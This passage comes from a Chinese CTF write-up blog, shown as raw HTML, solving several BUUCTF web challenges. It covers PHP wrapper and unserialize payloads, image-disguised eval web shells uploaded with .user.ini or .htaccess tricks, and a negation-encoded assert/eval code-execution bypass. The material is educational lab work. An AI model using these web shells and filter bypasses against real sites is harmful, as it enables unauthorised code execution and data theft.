class=\"hljs-variable\">$file</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;file&quot;</span>];<br><span class=\"hljs-variable\">$password</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;password&quot;</span>];<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$text</span>)&amp;&amp;(<span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$text</span>,<span class=\"hljs-string\">&#x27;r&#x27;</span>)===<span class=\"hljs-string\">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$text</span>,<span class=\"hljs-string\">&#x27;r&#x27;</span>).<span class=\"hljs-string\">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/flag/&quot;</span>,<span class=\"hljs-variable\">$file</span>))&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Not now!&quot;</span>;<br>        <span class=\"hljs-keyword\">exit</span>(); <br>    &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-keyword\">include</span>(<span class=\"hljs-variable\">$file</span>);  <span class=\"hljs-comment\">//useless.php</span><br>        <span class=\"hljs-variable\">$password</span> = <span class=\"hljs-title function_ invoke__\">unserialize</span>(<span class=\"hljs-variable\">$password</span>);<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$password</span>;<br>    &#125;<br>&#125;<br><span class=\"hljs-keyword\">else</span>&#123;<br>    <span class=\"hljs-title function_ invoke__\">highlight_file</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span> <br></code></pre></td></tr></table></figure>\n\n<p>第一个</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$text</span>)&amp;&amp;(<span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$text</span>,<span class=\"hljs-string\">&#x27;r&#x27;</span>)===<span class=\"hljs-string\">&quot;welcome to the zjctf&quot;</span>)<span class=\"hljs-comment\">//r为读取权限</span><br></code></pre></td></tr></table></figure>\n\n<p>file_get_contents()函数是将文件内容读取到变量，而这里是从变量读取，读取text变量的值，这里需要text变量为<code>welcome to the zjctf</code></p>\n<p>但是因为可能存在对变量的正则匹配，过滤，一般是用base64绕过</p>\n<p>这里就可以利用两个伪协议，php:&#x2F;&#x2F;input和data:&#x2F;&#x2F;，这两个一个是读取post数据，一个是读取get数据，这里用data:&#x2F;&#x2F;协议</p>\n<figure class=\"highlight xl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xl\">?<span class=\"hljs-keyword\">text</span>=<span class=\"hljs-keyword\">data</span>:<span class=\"hljs-comment\">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></code></pre></td></tr></table></figure>\n\n<p>当然这里不用base64也可以</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs livecodeserver\">?<span class=\"hljs-keyword\">text</span>=data://<span class=\"hljs-keyword\">text</span>/plain;welcome <span class=\"hljs-built_in\">to</span> <span class=\"hljs-keyword\">the</span> zjctf<br></code></pre></td></tr></table></figure>\n\n<p>第二个</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">include</span>(<span class=\"hljs-variable\">$file</span>);  <span class=\"hljs-comment\">//useless.php</span><br></code></pre></td></tr></table></figure>\n\n<p>一个文件包含，尝试用php:&#x2F;&#x2F;filter读取<code>useless.php</code></p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\">&amp;<span class=\"hljs-keyword\">file</span>=php://<span class=\"hljs-built_in\">filter</span>/<span class=\"hljs-keyword\">read</span>=conver.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure>\n\n<p>至于password，猜测应该是在useless.php里才有线索，先赋值1看看</p>\n<p>于是先构造一个payload</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?<span class=\"hljs-type\">text</span>=data://<span class=\"hljs-type\">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://<span class=\"hljs-keyword\">filter</span>/<span class=\"hljs-keyword\">read</span>=convert.base64-encode/resource=useless.php&amp;<span class=\"hljs-keyword\">password</span>=<span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<p>得到<code>useless.php</code>内容</p>\n<p><img src=\"/post/wp-buuctf/image-20220823175723137.png\" alt=\"image-20220823175723137\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo<br><br>解码后<br><br><span class=\"hljs-meta\">&lt;?php</span>  <br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Flag</span></span>&#123;  <span class=\"hljs-comment\">//flag.php  </span><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$file</span>;  <br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__tostring</span>(<span class=\"hljs-params\"></span>)</span>&#123;  <br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;file))&#123;  <br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$this</span>-&gt;file); <br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br>        <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-string\">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class=\"hljs-meta\">?&gt;</span>  <br></code></pre></td></tr></table></figure>\n\n<p>再看看password变量</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-variable\">$password</span> = <span class=\"hljs-title function_ invoke__\">unserialize</span>(<span class=\"hljs-variable\">$password</span>);<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$password</span>;<br></code></pre></td></tr></table></figure>\n<p>这里用了反序列化，所以password就是序列化后的值</p>\n<p>利用<code>useless.php</code>构造序列化</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>  <br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Flag</span></span>&#123; <br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$file</span>=<span class=\"hljs-string\">&quot;flag.php&quot;</span> ;  <br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__tostring</span>(<span class=\"hljs-params\"></span>)</span>&#123;  <br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;file))&#123;  <br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$this</span>-&gt;file); <br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br>        <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-string\">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class=\"hljs-variable\">$password</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Flag</span>();<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">serialize</span>(<span class=\"hljs-variable\">$password</span>);<br><span class=\"hljs-meta\">?&gt;</span>  <br></code></pre></td></tr></table></figure>\n\n<p>运行后        </p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">O</span>:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">&quot;Flag&quot;</span>:<span class=\"hljs-number\">1</span>:&#123;s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">&quot;file&quot;</span>;s:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">&quot;flag.php&quot;</span>;&#125;  <br></code></pre></td></tr></table></figure>\n\n<p>最后payload</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?<span class=\"hljs-type\">text</span>=data://<span class=\"hljs-type\">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;<span class=\"hljs-keyword\">password</span>=O:<span class=\"hljs-number\">4</span>:&quot;Flag&quot;:<span class=\"hljs-number\">1</span>:&#123;s:<span class=\"hljs-number\">4</span>:&quot;file&quot;;s:<span class=\"hljs-number\">8</span>:&quot;flag.php&quot;;&#125;<br><br>//仔细一下会注意到这里的file的值中，伪协议删除了，<br>这是因为开始默认都是<span class=\"hljs-keyword\">index</span>.php，但是<span class=\"hljs-keyword\">index</span>.php没有Flag类，<br>如果想执行反序列化，那就需要包含Flag类，也就是这里的useless.php里的<br>所以这里删除file里的伪协议，只留useless.php的文件名<br>就是利用  <span class=\"hljs-keyword\">include</span>($file); <br>把useless.php包含在<span class=\"hljs-keyword\">index</span>.php里，从而可以成功执行反序列化，得到flag<br></code></pre></td></tr></table></figure>\n\n<p>得到flag</p>\n<h2 id=\"9-SUCTF-2019-CheckIn\"><a href=\"#9-SUCTF-2019-CheckIn\" class=\"headerlink\" title=\"9.[SUCTF 2019]CheckIn\"></a>9.[SUCTF 2019]CheckIn</h2><h3 id=\"1-题目描述-6\"><a href=\"#1-题目描述-6\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-6\"><a href=\"#2-wp-6\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>先上传一个文本文件试试</p>\n<p><img src=\"/post/wp-buuctf/image-20220825173012665.png\" alt=\"image-20220825173012665\"></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">exif_imagetype是判断一个图像的类型的进程。<br></code></pre></td></tr></table></figure>\n\n<p>所以只能上传图片</p>\n<p>先上传一个包含PHP木马的图片马试试</p>\n<p><img src=\"/post/wp-buuctf/image-20220825174837632.png\" alt=\"image-20220825174837632\"></p>\n<p>看来是过滤了<code>&lt;?</code>，所以除了php,其他的asp,aspx,jsp,js都可以绕过</p>\n<p>这里以js举例</p>\n<p>创建一个js文件，内容为</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">&lt;script language=<span class=\"hljs-string\">&quot;php&quot;</span>&gt;@<span class=\"hljs-built_in\">eval</span>($_POST[<span class=\"hljs-string\">&quot;cmd&quot;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure>\n\n<p>在和一个普通图片合成，也可以加个文件头GIF89a</p>\n<p>图片马名为<code>haha.gif</code></p>\n<p>然后上传</p>\n<p><img src=\"/post/wp-buuctf/image-20220825210858681.png\" alt=\"image-20220825210858681\"></p>\n<p>由于不是php木马，所以无法用<code>.htaccess</code>文件绕过</p>\n<p>这里就需要用<code>.user.ini</code>配置文件,当然使用前提是<code>.user.ini</code>文件下有php文件，不然也不能包含了</p>\n<p>推荐看一下这篇<a href=\"https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html\">文章</a></p>\n<p><strong>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</strong></p>\n<p> <strong>这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。</strong></p>\n<p> <strong>其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</strong></p>\n<figure class=\"highlight angelscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs angelscript\"><span class=\"hljs-built_in\">auto</span>_append_file、<span class=\"hljs-built_in\">auto</span>_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而<span class=\"hljs-built_in\">auto</span>_append_file类似，只是在文件后面包含。 <br><br>使用方法很简单，直接写在.user.ini中：<br></code></pre></td></tr></table></figure>\n\n<p>所以这里设置自动包含的文件为<code>haha.gif</code></p>\n<p>于是<code>.user.ini</code>内容为</p>\n<figure class=\"highlight angelscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs angelscript\">GIF89a       <span class=\"hljs-comment\">//绕过图片判断         </span><br><span class=\"hljs-built_in\">auto</span>_prepend_file=haha.gif<br></code></pre></td></tr></table></figure>\n\n<p>上传<code>.user.ini</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220825214029074.png\" alt=\"image-20220825214029074\"></p>\n<p>这个时候haha.gif就已经包含在index.php，可以访问</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">http</span>://<span class=\"hljs-number\">9</span>c7a4b64-<span class=\"hljs-number\">1</span>c49-<span class=\"hljs-number\">4</span>ee4-a146-dc6763b5ce1c.node4.buuoj.cn:<span class=\"hljs-number\">81</span>/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php<br></code></pre></td></tr></table></figure>\n\n<p>能看到<code>GIF98a?</code></p>\n<p>然后也可以用hackbar，post上传命令，如图中的phpinfo()</p>\n<p><img src=\"/post/wp-buuctf/image-20220825215617387.png\" alt=\"image-20220825215617387\"></p>\n<figure class=\"highlight abnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs abnf\"><span class=\"hljs-attribute\">cmd</span><span class=\"hljs-operator\">=</span>var_dump(scandir(<span class=\"hljs-string\">&quot;/&quot;</span>))<span class=\"hljs-comment\">;//看看根目录，找到flag</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220825220933577.png\" alt=\"image-20220825220933577\"></p>\n<figure class=\"highlight abnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs abnf\"><span class=\"hljs-attribute\">cmd</span><span class=\"hljs-operator\">=</span>var_dump(file_get_contents(<span class=\"hljs-string\">&quot;/flag&quot;</span>))<span class=\"hljs-comment\">;//读取flag文件</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220825221229971.png\" alt=\"image-20220825221229971\"></p>\n<hr>\n<p>当然用蚁剑最简单，连接也成功</p>\n<p><img src=\"/post/wp-buuctf/image-20220825214728996.png\" alt=\"image-20220825214728996\"></p>\n<p>可以看到<strong>index.php文件也在上传的目录</strong>下，也就是<code>.user.ini</code>的同一个目录下，所以才可以成功包含</p>\n<p><img src=\"/post/wp-buuctf/image-20220825215454619.png\" alt=\"image-20220825215454619\"></p>\n<p>在根目录发现了flag，打开即可得到flag</p>\n<hr>\n<p>但我发现根目录一个clean.sh文件，这是一个定时清空linux服务器上缓存的文件脚本，上传的文件会被定时删除</p>\n<p><img src=\"/post/wp-buuctf/image-20220825215047906.png\" alt=\"image-20220825215047906\"></p>\n<p>这是一分钟左右后，靶场环境还在但是无法访问了，所以要快点拿取flag</p>\n<p><img src=\"/post/wp-buuctf/image-20220825215220524.png\" alt=\"image-20220825215220524\"></p>\n<p>这里本来想删掉clean.sh，发现没权限，无法执行，sudo也不行，那就只能速战速决了</p>\n<p><img src=\"/post/wp-buuctf/image-20220825220024393.png\" alt=\"image-20220825220024393\"></p>\n<p>根目录得到flag</p>\n<h2 id=\"10-GXYCTF2019-BabyUpload\"><a href=\"#10-GXYCTF2019-BabyUpload\" class=\"headerlink\" title=\"10.[GXYCTF2019]BabyUpload\"></a>10.[GXYCTF2019]BabyUpload</h2><h3 id=\"1-题目描述-7\"><a href=\"#1-题目描述-7\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-7\"><a href=\"#2-wp-7\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>这道题不难，但是开始不清楚还是不知道过滤了什么，</p>\n<p>这道题介绍几个点就可以了</p>\n<p>第一个是过滤了后缀名含ph</p>\n<p>第二也是关键的，它只允许上传<code>content-type: image/jpeg</code>，png和gif都不可以</p>\n<p>第三点就是它过滤了文件内容里含<code>&lt;?</code></p>\n<p>所以上传一个jpeg文件，抓包修改内容为非php但包含php的一个脚本，</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs jsp\">&lt;script language=<span class=\"hljs-string\">&quot;php&quot;</span>&gt;<span class=\"hljs-meta\">@eval($_POST[&quot;cmd&quot;])</span>;&lt;/script&gt;<br></code></pre></td></tr></table></figure>\n\n<p>再上传.htaccess文件，解析所有文件为php</p>\n<p>用蚁剑连接jpeg文件，即可</p>\n<h2 id=\"11-极客大挑战-2019-RCE-ME\"><a href=\"#11-极客大挑战-2019-RCE-ME\" class=\"headerlink\" title=\"11.[极客大挑战 2019]RCE ME\"></a>11.[极客大挑战 2019]RCE ME</h2><h3 id=\"1-题目描述-8\"><a href=\"#1-题目描述-8\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-8\"><a href=\"#2-wp-8\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>先对代码分析</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-title function_ invoke__\">error_reporting</span>(<span class=\"hljs-number\">0</span>);<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;code&#x27;</span>]))&#123;<br>            <span class=\"hljs-variable\">$code</span>=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;code&#x27;</span>];<br>                    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">strlen</span>(<span class=\"hljs-variable\">$code</span>)&gt;<span class=\"hljs-number\">40</span>)&#123;<br>                                        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;This is too Long.&quot;</span>);<br>                                                &#125;<br>                    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class=\"hljs-variable\">$code</span>))&#123;<br>                                        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;NO.&quot;</span>);<br>                                                &#125;<br>                    @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$code</span>);<br>&#125;<br><span class=\"hljs-keyword\">else</span>&#123;<br>            <span class=\"hljs-title function_ invoke__\">highlight_file</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br>&#125;<br><br><span class=\"hljs-comment\">// ?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>可以看到code被正则匹配，所以字母大小写和数字都不能输入</p>\n<p>这里就学到新东西了</p>\n<p><strong>取反绕过</strong></p>\n<p><u><strong>取反</strong>就是将数字转化为二进制,再把二进制中的1变成0,0变成1</u></p>\n<p><code>~</code>是取反符号，</p>\n<figure class=\"highlight mel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mel\">&lt;?php<br>echo urlencode(~<span class=\"hljs-string\">&#x27;assert&#x27;</span>);<br>echo urlencode(~<span class=\"hljs-string\">&#x27;eval($_REQUEST[8])&#x27;</span>);<br>?&gt;<br><br>结果：<br>%9E%8C%8C%9A%8D%8B<br>%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6<br><br><span class=\"hljs-comment\">//php断言：assert — 检查一个断言是否为 false，如果参数是字符串，它将会被 assert() 当做 PHP 代码来执行</span><br></code></pre></td></tr></table></figure>\n\n<p>然后再赋值</p>\n<figure class=\"highlight mel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mel\">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6);<br><br><span class=\"hljs-comment\">//注意后面要有；，代表php代码结束</span><br><span class=\"hljs-comment\">//这里~是取反，之前urlencode里取反了一次，赋值时再取反一次，相当于没有取反</span><br><br>等同于<br><br>?code=(assert)(<span class=\"hljs-keyword\">eval</span>($_REQUEST[<span class=\"hljs-number\">8</span>]));<br><br>(assert)因为是assert是函数，被当作函数执行，于是因为断言(<span class=\"hljs-keyword\">eval</span>($_REQUEST[<span class=\"hljs-number\">8</span>]))，所以把<span class=\"hljs-keyword\">eval</span>($_REQUEST[<span class=\"hljs-number\">8</span>])当作php执行，于是就可以拿到shell了<br></code></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight llvm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\">蚁剑连接<br><span class=\"hljs-symbol\">http:</span>//url?code<span class=\"hljs-operator\">=</span>(~<span class=\"hljs-variable\">%9</span>E<span class=\"hljs-variable\">%8</span>C<span class=\"hljs-variable\">%8</span>C<span class=\"hljs-variable\">%9</span>A<span class=\"hljs-variable\">%8</span>D<span class=\"hljs-variable\">%8</span>B)(~<span class=\"hljs-variable\">%9</span>A<span class=\"hljs-variable\">%89</span><span class=\"hljs-variable\">%9</span>E<span class=\"hljs-variable\">%93</span><span class=\"hljs-variable\">%D7</span><span class=\"hljs-variable\">%DB</span><span class=\"hljs-variable\">%A0</span><span class=\"hljs-variable\">%AD</span><span class=\"hljs-variable\">%BA</span><span class=\"hljs-variable\">%AE</span><span class=\"hljs-variable\">%AA</span><span class=\"hljs-variable\">%BA</span><span class=\"hljs-variable\">%AC</span><span class=\"hljs-variable\">%AB</span><span class=\"hljs-variable\">%A4</span><span class=\"hljs-variable\">%C7</span><span class=\"hljs-variable\">%A2</span><span class=\"hljs-variable\">%D6</span>)<span class=\"hljs-comment\">;</span><br></code></pre></td></tr></table></figure>\n\n<p>但是发现flag是空的</p>\n<p><img src=\"/post/wp-buuctf/image-20220903181221552.png\" alt=\"image-20220903181221552\"></p>\n<p>看了其他大佬的wp才知道，需要蚁剑插件<code>disable_functions</code>，禁止网站的函数，防止其阻止读取flag</p>\n<p><img src=\"/post/wp-buuctf/image-20220903181348649.png\" alt=\"image-20220903181348649\"></p>\n<p>再在主页右键</p>\n<p><img src=\"/post/wp-buuctf/image-20220903181431745.png\" alt=\"image-20220903181431745\"></p>\n<p>模式选择</p>\n<p><img src=\"/post/wp-buuctf/image-20220903181451266.png\" alt=\"image-20220903181451266\"></p>\n<p>然后点击开始</p>\n<p>终端输入</p>\n<p><code>/readflag</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220903181528195.png\" alt=\"image-20220903181528195\"></p>\n<p>得到flag</p>\n<h2 id=\"12-GXYCTF2019-BabySQli\"><a href=\"#12-GXYCTF2019-BabySQli\" class=\"headerlink\" title=\"12.[GXYCTF2019]BabySQli\"></a>12.[GXYCTF2019]BabySQli</h2><h3 id=\"1-题目描述-9\"><a href=\"#1-题目描述-9\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-9\"><a href=\"#2-wp-9\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>开始是一个登录框</p>\n<p><img src=\"/post/wp-buuctf/image-20220909203922998.png\" alt=\"image-20220909203922998\"></p>\n<p>我们随便输入一个账号密码</p>\n<figure class=\"highlight nsis\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nsis\">账号：<span class=\"hljs-literal\">admin</span><br>密码：<span class=\"hljs-number\">123456</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220909204018695.png\" alt=\"image-20220909204018695\"></p>\n<p>报错，看来用户名没错，密码错误</p>\n<p>查看源码看看</p>\n<p><img src=\"/post/wp-buuctf/image-20220909204046072.png\" alt=\"image-20220909204046072\"></p>\n<p>发现有一串加密字符，看起来像base</p>\n<p>先用<code>base32</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220909204202994.png\" alt=\"image-20220909204202994\"></p>\n<p>看起来就是<code>base32+base64</code>混合编码，再用<code>base64</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220909204325138.png\" alt=\"image-20220909204325138\"></p>\n<hr>\n<p>当然看不出来，直接无脑<code>ciphey</code>，也可以，当然还是需要了解不同编码和加密字符的特点</p>\n<p><img src=\"/post/wp-buuctf/image-20220909204746167.png\" 